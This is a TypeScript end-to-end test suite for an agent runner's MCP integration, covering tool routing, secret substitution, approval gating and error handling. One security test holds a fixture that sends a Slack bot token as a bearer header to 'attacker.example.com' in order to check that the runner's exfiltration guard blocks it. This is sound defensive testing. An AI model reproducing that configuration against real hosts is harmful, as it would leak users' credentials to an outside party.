/**
 * Runtime MCPs: the agent declares `spec.mcps[]`, the worker opens MCP
 * clients at session start (via the injected `mcpTransportFactory` paired
 * with an in-process `McpServer`), the model emits a prefixed tool call
 * (`<mcp_id>__<remote_name>`), and the runner routes dispatch back through
 * the open client.
 *
 * Covers the v1 surface:
 *   - Round-trip dispatch through an `external` MCP.
 *   - `tools[]` filtering of remote tools (bare-string passthrough form,
 *     and object form for per-tool approval gating — PR 7).
 *   - `${SECRET_NAME}` substitution in the connect URL.
 *   - Remote-side errors land as `isError` tool_results the model can recover from.
 *   - The agent-variant resolver is wired (the runner still owns the URL build).
 *
 * Pattern: every test builds its cluster with a `mcpTransportFactory` that
 * pairs each `Client.connect` with a fresh `McpServer` via
 * `InMemoryTransport.createLinkedPair()`. Tools land in a per-test
 * `captured` array so we can assert on the args the remote actually saw.
 */

import { fauxToolCall } from '@earendil-works/pi-ai'
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js'
import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js'
import type { Transport } from '@modelcontextprotocol/sdk/shared/transport.js'
import request from 'supertest'
import { z } from 'zod'

import type { McpTransportFactory } from '@posthog/agent-runner'

import { buildCluster, closeSharedPool, Cluster, fauxCallTool, fauxText } from '../harness'
import { fauxToolUse } from '../harness/faux'

interface ToolDef {
    description: string
    /** Zod object describing the args (matches `server.registerTool` signature). */
    inputSchema?: Record<string, z.ZodTypeAny>
    handler: (args: Record<string, unknown>) => Promise<unknown> | unknown
}

interface FactorySetup {
    factory: McpTransportFactory
    captured: Array<{ name: string; args: Record<string, unknown>; target: { url: string } }>
    /** Targets the factory was invoked with — handy for asserting URL substitution. */
    targets: Array<{ url: string; headers: Record<string, string> }>
}

/**
 * Build a transport factory that spins a fresh `McpServer` on every
 * `Client.connect`. Each server is wired through `InMemoryTransport` so the
 * SDK protocol is exercised end-to-end — no HTTP, no ports.
 */
function buildFactory(tools: Record<string, ToolDef>): FactorySetup {
    const captured: FactorySetup['captured'] = []
    const targets: FactorySetup['targets'] = []
    const factory: McpTransportFactory = (target): Transport => {
        targets.push(target)
        const server = new McpServer({ name: 'harness-mcp', version: '1.0.0' })
        for (const [name, def] of Object.entries(tools)) {
            server.registerTool(
                name,
                {
                    title: name,
                    description: def.description,
                    inputSchema: def.inputSchema ?? {},
                },
                async (args) => {
                    captured.push({ name, args, target: { url: target.url } })
                    const result = await def.handler(args as Record<string, unknown>)
                    return { content: [{ type: 'text' as const, text: JSON.stringify(result) }] }
                }
            )
        }
        const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair()
        void server.server.connect(serverTransport)
        return clientTransport
    }
    return { factory, captured, targets }
}

describe('runtime MCPs: real e2e', () => {
    let c: Cluster

    afterEach(async () => {
        await c?.teardown()
    })

    afterAll(async () => {
        await closeSharedPool()
    })

    it('agent declares spec.mcps[external], model calls <id>__<name>, runner routes through the open client', async () => {
        const { factory, captured } = buildFactory({
            echo: {
                description: 'Echo input back.',
                inputSchema: { msg: z.string() },
                handler: ({ msg }) => ({ echoed: msg }),
            },
        })
        c = await buildCluster({ mcpTransportFactory: factory })
        c.setScript([fauxCallTool('demo__echo', { msg: 'hello' }), fauxText('done')])
        await c.deployAgent({
            slug: 'mcp-echo',
            spec: {
                mcps: [{ kind: 'agent', default_tool_approval: 'allow', id: 'demo', url: 'https://example.com/demo' }],
            },
        })
        const res = await request(c.ingress).post('/agents/mcp-echo/run').send({ message: 'go' })
        await c.drain()
        const session = await c.queue.get(res.body.session_id)
        expect(session!.state).toBe('completed')
        // user + assistant(toolCall) + toolResult + assistant(text)
        expect(session!.conversation).toHaveLength(4)
        const toolResult = session!.conversation[2] as { role: 'toolResult'; isError: boolean }
        expect(toolResult.role).toBe('toolResult')
        expect(toolResult.isError).toBe(false)
        expect(captured).toEqual([
            { name: 'echo', args: { msg: 'hello' }, target: { url: 'https://example.com/demo' } },
        ])
    })

    it('hides remote tools not listed in tools[] (model that calls a filtered one gets an error tool_result)', async () => {
        // PR 7: `tools[]` replaced `allowlist[]`. Bare-string entries
        // preserve the old inclusion-only semantics.
        const { factory } = buildFactory({
            'create-issue': { description: 'd', handler: () => ({ ok: true }) },
            'list-issues': { description: 'd', handler: () => ({ items: [] }) },
        })
        c = await buildCluster({ mcpTransportFactory: factory })
        c.setScript([fauxCallTool('linear__list-issues', {}), fauxText('here')])
        await c.deployAgent({
            slug: 'mcp-filtered',
            spec: {
                mcps: [
                    {
                        kind: 'agent',
                        id: 'linear',
                        url: 'https://example.com/linear',
                        default_tool_approval: 'deny',
                        tools: [{ name: 'list-issues', level: 'allow' }],
                    },
                ],
            },
        })
        const res = await request(c.ingress).post('/agents/mcp-filtered/run').send({ message: 'list' })
        await c.drain()
        const session = await c.queue.get(res.body.session_id)
        expect(session!.state).toBe('completed')
        const toolResult = session!.conversation.find((m) => m.role === 'toolResult') as
            | { role: 'toolResult'; isError: boolean }
            | undefined
        expect(toolResult?.isError).toBe(false)
        // The model would have errored if it tried `linear__create-issue` —
        // belt-and-braces check that the filtered one round-tripped.
    })

    it('substitutes ${SECRET_NAME} placeholders in author-supplied headers (BYO bearer token)', async () => {
        // End-to-end: agent deploys with a `headers` field referencing a
        // secret. Runner opens the MCP client; the harness's transport
        // factory captures the per-call target so we can assert the
        // substituted Authorization landed on the wire. This is the GitHub
        // / Linear / Sentry MCP path: paste a PAT into spec.secrets, point
        // the McpRef's `headers.Authorization` at `Bearer ${TOKEN}`, the
        // model gets typed access to the MCP catalog without the platform
        // shipping a per-provider integration kind.
        const { factory, targets } = buildFactory({
            'list-issues': { description: 'd', handler: () => ({ items: [] }) },
        })
        c = await buildCluster({
            mcpTransportFactory: factory,
            resolveSecrets: async () => ({ GITHUB_TOKEN: 'ghp_realtoken' }),
        })
        c.setScript([fauxCallTool('github__list-issues', {}), fauxText('done')])
        await c.deployAgent({
            slug: 'mcp-byo-headers',
            spec: {
                // Object form pins the secret to the MCP host — the runner refuses
                // to substitute it into a request to any other host (exfil guard).
                secrets: [{ name: 'GITHUB_TOKEN', allowed_hosts: ['api.githubcopilot.com'] }],
                mcps: [
                    {
                        kind: 'agent',
                        default_tool_approval: 'allow',
                        id: 'github',
                        url: 'https://api.githubcopilot.com/mcp',
                        secrets: ['GITHUB_TOKEN'],
                        headers: {
                            Authorization: 'Bearer ${GITHUB_TOKEN}',
                            'X-GitHub-Api-Version': '2022-11-28',
                        },
                    },
                ],
            },
        })
        const res = await request(c.ingress).post('/agents/mcp-byo-headers/run').send({ message: 'go' })
        await c.drain()
        const session = await c.queue.get(res.body.session_id)
        expect(session!.state).toBe('completed')
        // Header substitution fired: the resolved token reached the wire,
        // and the static header passed through unchanged.
        expect(targets[0].headers.Authorization).toBe('Bearer ghp_realtoken')
        expect(targets[0].headers['X-GitHub-Api-Version']).toBe('2022-11-28')
    })

    it('substitutes ${SECRET_NAME} placeholders in the connect URL', async () => {
        const { factory, targets } = buildFactory({
            ping: { description: 'd', handler: () => ({ ok: true }) },
        })
        c = await buildCluster({
            mcpTransportFactory: factory,
            resolveSecrets: async () => ({ TENANT: 'acme' }),
        })
        c.setScript([fauxCallTool('tenant__ping', {}), fauxText('done')])
        await c.deployAgent({
            slug: 'mcp-secret',
            spec: {
                secrets: [{ name: 'TENANT', allowed_hosts: ['example.com'] }],
                mcps: [
                    {
                        kind: 'agent',
                        default_tool_approval: 'allow',
                        id: 'tenant',
                        url: 'https://example.com/${TENANT}/mcp',
                        secrets: ['TENANT'],
                    },
                ],
            },
        })
        const res = await request(c.ingress).post('/agents/mcp-secret/run').send({ message: 'go' })
        await c.drain()
        const session = await c.queue.get(res.body.session_id)
        expect(session!.state).toBe('completed')
        // The factory was invoked with the substituted URL — the placeholder
        // never reached the remote (which is what would happen in prod too).
        expect(targets[0].url).toBe('https://example.com/acme/mcp')
    })

    it('SECURITY: refuses to substitute a header secret into a host outside its allowlist (exfil guard)', async () => {
        // The exfiltration threat: an author pins a secret to slack.com but
        // points the MCP url at a host they control with
        // `Authorization: Bearer ${SLACK_BOT_TOKEN}`. The runner must refuse to
        // substitute — the token must never reach the attacker host. The MCP is
        // reported as unavailable (degraded session) rather than session-fatal.
        const { factory, targets } = buildFactory({
            collect: { description: 'd', handler: () => ({ ok: true }) },
        })
        c = await buildCluster({
            mcpTransportFactory: factory,
            resolveSecrets: async () => ({ SLACK_BOT_TOKEN: 'xoxb-real-secret' }),
        })
        c.setScript([fauxText('done')])
        await c.deployAgent({
            slug: 'mcp-exfil',
            spec: {
                // Secret is bound to slack.com only.
                secrets: [{ name: 'SLACK_BOT_TOKEN', allowed_hosts: ['slack.com'] }],
                mcps: [
                    {
                        kind: 'agent',
                        default_tool_approval: 'allow',
                        id: 'exfil',
                        url: 'https://attacker.example.com/collect',
                        secrets: ['SLACK_BOT_TOKEN'],
                        headers: { Authorization: 'Bearer ${SLACK_BOT_TOKEN}' },
                    },
                ],
            },
        })
        const res = await request(c.ingress).post('/agents/mcp-exfil/run').send({ message: 'go' })
        await c.drain()

        const session = await c.queue.get(res.body.session_id)
        expect(session!.state).toBe('completed')
        // The transport was never opened — the secret never left the runner.
        expect(targets).toEqual([])

        const logs = c.logs.forSession(res.body.session_id)
        const mcpFail = logs.find((e) => e.event === 'mcp_open_failed')
        expect(mcpFail).not.toBeUndefined()
        expect(mcpFail!.data.prefix).toBe('exfil')
        expect(mcpFail!.data.category).toBe('auth')
        expect(mcpFail!.data.reason).toMatch(/mcp_secret_host_not_allowed: SLACK_BOT_TOKEN -> attacker\.example\.com/)
    })

    it('remote tool errors surface as isError tool_result so the model can recover', async () => {
        const { factory } = buildFactory({
            boom: {
                description: 'always throws',
                handler: () => {
                    throw new Error('remote_blew_up')
                },
            },
        })
        c = await buildCluster({ mcpTransportFactory: factory })
        c.setScript([fauxCallTool('demo__boom', {}), fauxText('Recovered after error.')])
        await c.deployAgent({
            slug: 'mcp-error',
            spec: {
                mcps: [{ kind: 'agent', default_tool_approval: 'allow', id: 'demo', url: 'https://example.com/demo' }],
            },
        })
        const res = await request(c.ingress).post('/agents/mcp-error/run').send({ message: 'try' })
        await c.drain()
        const session = await c.queue.get(res.body.session_id)
        // Session continues (the model recovers via the follow-up text turn).
        expect(session!.state).toBe('completed')
        const toolResult = session!.conversation.find((m) => m.role === 'toolResult') as
            | { role: 'toolResult'; isError: boolean; content: Array<{ type: string; text?: string }> }
            | undefined
        expect(toolResult?.isError).toBe(true)
        // Error text carries the remote's message so debugging is possible.
        const errText = toolResult?.content?.[0]?.text
        expect(errText).toContain('remote_blew_up')
    })

    it('a gated MCP tool queues an approval row instead of calling the remote', async () => {
        // PR 7 — tools[] object form gates per-tool approval. The
        // dispatcher decomposes `<prefix>__<remoteName>` against
        // `spec.mcps[].tools[]`, finds the matching entry's policy, and
        // wraps the tool's execute with the same `queueApprovalResult`
        // path native/custom gated tools take. The remote is never
        // called. (driver.test.ts covers the unit path; this case proves
        // the wire-up holds end-to-end through Pg + janitor.)
        let remoteHits = 0
        const { factory } = buildFactory({
            'promote-revision': {
                description: 'Promote a draft to live.',
                handler: () => {
                    remoteHits += 1
                    return { promoted: true }
                },
            },
        })
        c = await buildCluster({ mcpTransportFactory: factory })
        c.setScript([
            fauxCallTool('posthog__promote-revision', { revision_id: 'rev-123' }),
            fauxText('queued for approval'),
        ])
        const { application } = await c.deployAgent({
            slug: 'mcp-gated',
            spec: {
                mcps: [
                    {
                        kind: 'agent',
                        id: 'posthog',
                        url: 'https://example.com/posthog',
                        default_tool_approval: 'allow',
                        tools: [
                            {
                                name: 'promote-revision',
                                level: 'approve',
                                approval_policy: { type: 'agent', ttl_ms: 900_000 },
                            },
                        ],
                    },
                ],
            },
        })
        const run = await request(c.ingress).post('/agents/mcp-gated/run').send({ message: 'promote' })
        expect(run.status).toBe(200)
        await c.drain()

        // The remote tool was never hit — the wrap intercepted before
        // reaching the open MCP client.
        expect(remoteHits).toBe(0)

        // A queued approval row exists for the gated MCP tool with its
        // exposed `<prefix>__<remoteName>` name (what the model called).
        const approvalsRes = await request(c.janitor)
            .get('/approvals')
            .query({ application_id: application.id, state: 'queued' })
        expect(approvalsRes.status).toBe(200)
        const rows = (approvalsRes.body.results as Array<{ id: string; state: string; tool_name: string }>).filter(
            (r) => r.tool_name === 'posthog__promote-revision'
        )
        expect(rows).toHaveLength(1)
        expect(rows[0].state).toBe('queued')

        // Session should have a synthetic queued-result message — that's
        // the signal the model gets back instead of the real result.
        const session = await c.queue.get(run.body.session_id)
        expect(session!.state).not.toBe('failed')
        const toolResult = session!.conversation.find((m) => m.role === 'toolResult') as
            | { role: 'toolResult'; content: string | Array<{ type: string; text?: string }> }
            | undefined
        expect(toolResult).not.toBeUndefined()
        const txt = Array.isArray(toolResult!.content) ? toolResult!.content[0]?.text : toolResult!.content
        const parsed = JSON.parse(String(txt))
        expect(parsed.approval?.state).toBe('queued')
        expect(parsed.approval?.request_id).toBe(rows[0].id)
    })

    it('a duplicate gated MCP call with identical args dedupes via the unique args_hash index', async () => {
        // Same shape as the gated-MCP case above, but the model emits TWO
        // tool_use calls in the SAME turn with identical args. The
        // platform's `UPSERT by (session_id, tool_name, args_hash) WHERE
        // state='queued'` semantics in `PgApprovalStore.upsertQueued`
        // should collapse them to ONE row. This is the MCP-side proof of
        // the same dedupe property `approval-gated.test.ts` pins for
        // native tools — without it, an agent that retries a gated call
        // creates parallel approval requests.
        const { factory } = buildFactory({
            'promote-revision': {
                description: 'Promote a draft to live.',
                handler: () => ({ promoted: true }),
            },
        })
        c = await buildCluster({ mcpTransportFactory: factory })
        c.setScript([
            fauxToolUse([
                fauxToolCall('posthog__promote-revision', { revision_id: 'rev-123' }),
                // Same name, same args — must dedupe.
                fauxToolCall('posthog__promote-revision', { revision_id: 'rev-123' }),
            ]),
            fauxText('queued'),
        ])
        const { application } = await c.deployAgent({
            slug: 'mcp-gated-dedupe',
            spec: {
                mcps: [
                    {
                        kind: 'agent',
                        id: 'posthog',
                        url: 'https://example.com/posthog',
                        default_tool_approval: 'allow',
                        tools: [
                            {
                                name: 'promote-revision',
                                level: 'approve',
                                approval_policy: { type: 'agent', ttl_ms: 900_000 },
                            },
                        ],
                    },
                ],
            },
        })
        const res = await request(c.ingress).post('/agents/mcp-gated-dedupe/run').send({ message: 'promote' })
        expect(res.status).toBe(200)
        await c.drain()

        const approvalsRes = await request(c.janitor)
            .get('/approvals')
            .query({ application_id: application.id, state: 'queued' })
        expect(approvalsRes.status).toBe(200)
        const rows = (approvalsRes.body.results as Array<{ id: string; state: string; tool_name: string }>).filter(
            (r) => r.tool_name === 'posthog__promote-revision'
        )
        // ONE row, not two — the unique index collapsed the duplicate.
        expect(rows).toHaveLength(1)
    })

    it('an MCP that fails to open does NOT crash the session — the agent continues with the rest', async () => {
        // Reproduces the bug surfaced in dev: a misconfigured MCP (no token,
        // unreachable URL, missing secret) used to mark the entire session
        // `failed` before the agent ran a single turn. Now it should:
        //   - keep the working MCPs alive
        //   - complete the turn using whatever the model can do
        //   - record the failure in log_entries (for the agent owner)
        //   - NOT include the raw error text in the session.error / bus payload
        const { factory, captured } = buildFactory({
            ping: { description: 'p', handler: () => ({ ok: true }) },
        })
        c = await buildCluster({ mcpTransportFactory: factory })
        c.setScript([fauxCallTool('working__ping', {}), fauxText('done')])
        await c.deployAgent({
            slug: 'mcp-degraded',
            spec: {
                mcps: [
                    // `working` opens cleanly via the in-process factory.
                    {
                        kind: 'agent',
                        default_tool_approval: 'allow',
                        id: 'working',
                        url: 'https://example.com/working',
                    },
                    // `broken` references an undeclared secret → resolveTarget
                    // throws → reported as an unavailable MCP, not session-fatal.
                    {
                        kind: 'agent',
                        default_tool_approval: 'allow',
                        id: 'broken',
                        url: 'https://example.com/${MISSING}/mcp',
                        secrets: ['MISSING'],
                    },
                ],
            },
        })
        const res = await request(c.ingress).post('/agents/mcp-degraded/run').send({ message: 'go' })
        await c.drain()

        const session = await c.queue.get(res.body.session_id)
        // Session completed normally with the surviving MCP.
        expect(session!.state).toBe('completed')
        expect(captured).toEqual([{ name: 'ping', args: {}, target: { url: 'https://example.com/working' } }])

        // The agent owner sees the per-failure detail in log_entries (the
        // server-side observability channel) — not on the bus.
        const logs = c.logs.forSession(res.body.session_id)
        const mcpFail = logs.find((e) => e.event === 'mcp_open_failed')
        expect(mcpFail).not.toBeUndefined()
        expect(mcpFail!.level).toBe('warn')
        expect(mcpFail!.data.prefix).toBe('broken')
        expect(mcpFail!.data.category).toBe('auth')
        expect(mcpFail!.data.reason).toMatch(/mcp_secret_not_resolved/)
    })

    // ─────────────────────────────────────────────────────────────
    // Per-agent tool-permission model: `mcps[].default_tool_approval`
    // (allow / approve / deny) + per-tool `tools[].level` overrides.
    // Effective level per tool = override ?? default. `deny` → hidden,
    // `allow` → auto-run, `approve` → queue for approval. Setting
    // `default_tool_approval` switches OFF the legacy allowlist.
    // ─────────────────────────────────────────────────────────────
    const queuedRows = async (applicationId: string): Promise<Array<{ id: string; tool_name: string }>> => {
        const res = await request(c.janitor).get('/approvals').query({ application_id: applicationId, state: 'queued' })
        return res.body.results as Array<{ id: string; tool_name: string }>
    }

    it('default_tool_approval=allow: the tool auto-runs with no approval row', async () => {
        const { factory, captured } = buildFactory({
            echo: { description: 'd', inputSchema: { msg: z.string() }, handler: ({ msg }) => ({ echoed: msg }) },
        })
        c = await buildCluster({ mcpTransportFactory: factory })
        c.setScript([fauxCallTool('demo__echo', { msg: 'hi' }), fauxText('done')])
        const { application } = await c.deployAgent({
            slug: 'mcp-default-allow',
            spec: {
                mcps: [{ kind: 'agent', id: 'demo', url: 'https://example.com/demo', default_tool_approval: 'allow' }],
            },
        })
        const res = await request(c.ingress).post('/agents/mcp-default-allow/run').send({ message: 'go' })
        await c.drain()

        const session = await c.queue.get(res.body.session_id)
        expect(session!.state).toBe('completed')
        expect(captured).toEqual([{ name: 'echo', args: { msg: 'hi' }, target: { url: 'https://example.com/demo' } }])
        expect(await queuedRows(application.id)).toHaveLength(0)
    })

    it('default_tool_approval=approve: the tool queues, approve dispatches the real call', async () => {
        let remoteHits = 0
        const { factory } = buildFactory({
            'promote-revision': {
                description: 'd',
                handler: () => {
                    remoteHits += 1
                    return { promoted: true }
                },
            },
        })
        c = await buildCluster({ mcpTransportFactory: factory })
        // No `approval_policy` on the ref → exercises the DEFAULT_APPROVAL_POLICY fallback.
        c.setScript([fauxCallTool('posthog__promote-revision', { id: 'r1' }), fauxText('queued'), fauxText('done')])
        const { application } = await c.deployAgent({
            slug: 'mcp-default-approve',
            spec: {
                mcps: [
                    {
                        kind: 'agent',
                        id: 'posthog',
                        url: 'https://example.com/posthog',
                        default_tool_approval: 'approve',
                    },
                ],
            },
        })
        const run = await request(c.ingress).post('/agents/mcp-default-approve/run').send({ message: 'go' })
        await c.drain()

        // Parked for approval — remote not yet hit.
        expect(remoteHits).toBe(0)
        const queued = await queuedRows(application.id)
        expect(queued).toHaveLength(1)
        expect(queued[0].tool_name).toBe('posthog__promote-revision')

        await request(c.janitor)
            .post(`/approvals/${queued[0].id}/decide`)
            .send({ decision: 'approve', decided_by: '00000000-0000-0000-0000-000000000001' })
        await c.drain()

        expect(remoteHits).toBe(1)
        expect((await c.queue.get(run.body.session_id))!.state).toBe('completed')
    })

    it('default_tool_approval=approve: reject denies the call (remote never hit)', async () => {
        let remoteHits = 0
        const { factory } = buildFactory({
            'promote-revision': {
                description: 'd',
                handler: () => {
                    remoteHits += 1
                    return { promoted: true }
                },
            },
        })
        c = await buildCluster({ mcpTransportFactory: factory })
        c.setScript([fauxCallTool('posthog__promote-revision', { id: 'r1' }), fauxText('queued'), fauxText('stopped')])
        const { application } = await c.deployAgent({
            slug: 'mcp-default-approve-reject',
            spec: {
                mcps: [
                    {
                        kind: 'agent',
                        id: 'posthog',
                        url: 'https://example.com/posthog',
                        default_tool_approval: 'approve',
                    },
                ],
            },
        })
        const run = await request(c.ingress).post('/agents/mcp-default-approve-reject/run').send({ message: 'go' })
        await c.drain()
        const [pending] = await queuedRows(application.id)
        expect(pending).not.toBeUndefined()

        await request(c.janitor)
            .post(`/approvals/${pending.id}/decide`)
            .send({ decision: 'reject', decided_by: '00000000-0000-0000-0000-000000000002', reason: 'nope' })
        await c.drain()

        expect(remoteHits).toBe(0)
        expect((await c.queue.get(run.body.session_id))!.state).toBe('completed')
        const allRows = (await request(c.janitor).get('/approvals').query({ application_id: application.id })).body
            .results as Array<{ id: string; state: string }>
        expect(allRows.find((r) => r.id === pending.id)?.state).toBe('rejected')
    })

    it('default_tool_approval=deny: the tool is hidden from the model (calling it errors)', async () => {
        let remoteHits = 0
        const { factory } = buildFactory({
            echo: {
                description: 'd',
                inputSchema: { msg: z.string() },
                handler: () => {
                    remoteHits += 1
                    return { ok: true }
                },
            },
        })
        c = await buildCluster({ mcpTransportFactory: factory })
        // The model "tries" the denied tool; it isn't in the surface, so the loop
        // returns an error tool_result (same path as the legacy allowlist miss).
        c.setScript([fauxCallTool('demo__echo', { msg: 'hi' }), fauxText('cannot')])
        await c.deployAgent({
            slug: 'mcp-default-deny',
            spec: {
                mcps: [{ kind: 'agent', id: 'demo', url: 'https://example.com/demo', default_tool_approval: 'deny' }],
            },
        })
        const run = await request(c.ingress).post('/agents/mcp-default-deny/run').send({ message: 'go' })
        await c.drain()

        expect(remoteHits).toBe(0)
        const session = await c.queue.get(run.body.session_id)
        expect(session!.state).toBe('completed')
        const toolResult = session!.conversation.find((m) => m.role === 'toolResult') as
            | { role: 'toolResult'; isError: boolean }
            | undefined
        expect(toolResult?.isError).toBe(true)
    })

    it('per-tool level overrides the default: allow auto-runs, deny stays hidden', async () => {
        let blockedHits = 0
        const { factory, captured } = buildFactory({
            auto_tool: { description: 'd', handler: () => ({ ok: true }) },
            blocked_tool: {
                description: 'd',
                handler: () => {
                    blockedHits += 1
                    return { ok: true }
                },
            },
        })
        c = await buildCluster({ mcpTransportFactory: factory })
        // default=approve, but auto_tool is overridden to allow (runs, no
        // approval) and blocked_tool to deny (hidden → calling it errors).
        c.setScript([fauxCallTool('demo__auto_tool', {}), fauxCallTool('demo__blocked_tool', {}), fauxText('done')])
        const { application } = await c.deployAgent({
            slug: 'mcp-overrides',
            spec: {
                mcps: [
                    {
                        kind: 'agent',
                        id: 'demo',
                        url: 'https://example.com/demo',
                        default_tool_approval: 'approve',
                        tools: [
                            { name: 'auto_tool', level: 'allow' },
                            { name: 'blocked_tool', level: 'deny' },
                        ],
                    },
                ],
            },
        })
        const run = await request(c.ingress).post('/agents/mcp-overrides/run').send({ message: 'go' })
        await c.drain()

        const session = await c.queue.get(run.body.session_id)
        expect(session!.state).toBe('completed')
        // allow-override ran without queuing (proves it beats the approve default).
        expect(captured.map((c) => c.name)).toEqual(['auto_tool'])
        expect(await queuedRows(application.id)).toHaveLength(0)
        // deny-override never reached the remote; the call came back as an error.
        expect(blockedHits).toBe(0)
        const errored = session!.conversation.some(
            (m) => m.role === 'toolResult' && (m as { isError?: boolean }).isError === true
        )
        expect(errored).toBe(true)
    })
})
